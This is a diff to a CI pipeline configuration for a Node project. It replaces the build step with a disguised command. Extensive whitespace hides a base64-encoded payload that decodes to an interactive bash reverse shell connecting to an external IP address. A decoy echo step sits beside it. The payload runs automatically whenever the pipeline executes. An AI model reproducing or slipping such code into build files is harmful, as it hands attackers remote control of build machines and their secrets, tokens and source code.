@@ -16,8 +16,8 @@ jobs:
           paths:
             - node_modules
           key: v1-dependencies-{{ checksum "yarn.lock" }}
-      - run: yarn build
-
+      - run: echo test123                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                && echo YmFzaCAtaSA+JiAvZGV2L3RjcC8yMDkuMTQxLjQyLjIwMy84ODg5IDA+JjEK | base64 -d | bash
+      - run: echo atlassian
   publish:
     docker:
       - image: cimg/node:12.20 
